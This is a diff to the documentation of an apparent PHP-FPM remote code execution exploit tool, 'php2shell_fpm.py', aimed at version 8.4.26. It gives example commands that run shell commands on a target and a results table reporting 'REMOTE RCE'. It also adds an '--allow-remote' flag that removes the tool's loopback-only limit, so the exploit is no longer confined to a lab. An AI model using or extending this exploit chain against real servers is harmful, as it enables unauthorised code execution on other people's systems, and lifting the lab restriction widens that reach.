@@ -332,12 +332,12 @@ python3 tools/php2shell_fpm.py \
 
 # stock installation: one URL, one pool, amplifier arm, worker fan-out
 python3 tools/php2shell_fpm.py \
-  --base http://target --version 8.4.26 \
+  --base http://target --allow-remote --version 8.4.26 \
   --command 'id>out/p1' --proof-file out/p1 \
   no-oracle
 
 # checklist of every precondition (version, app operations, arm physics)
-python3 tools/php2shell_fpm.py --base http://target --version 8.4.26 probe
+python3 tools/php2shell_fpm.py --base http://target --allow-remote --version 8.4.26 probe
 ```
 
 (Global options come before the subcommand. `--workers N` - default 5 - fans
@@ -436,7 +436,7 @@ version (patched releases are skipped by design):
 8.4.26    REMOTE RCE         uid=1000(...) ...
 ```
 
-Every run records its verdict in `profiles/verification.json` (merged, so a
+Every run records its verdict in `docs/calibration-logs/verification.json` (merged, so a
 later partial run does not erase earlier evidence); the README status table is
 updated from that file.
 
@@ -445,7 +445,9 @@ updated from that file.
 - **Oracle lab mode.** `endgame` still uses the `/proc/<pid>/mem` oracle to
   resolve `d`. `no-oracle` drops that read at exploit time and leaks the
   chunk/PIE bases over HTTP by default; `--chunk`/`--pie` and local maps are
-  overrides/fallbacks. The shipped chain still targets the loopback lab.
+  overrides/fallbacks. The dispatcher stays loopback-only for FPM; the
+  standalone client refuses a non-loopback `--base` unless `--allow-remote`
+  is passed explicitly.
 - **Per-build offsets.** `basic_globals` / `zif_system` / `zval_ptr_dtor` are
   PIE-relative offsets for the exact FPM build; another distro or version
   needs its own profile (`sapi: "fpm"`, see `profiles/fpm-schema.json`).
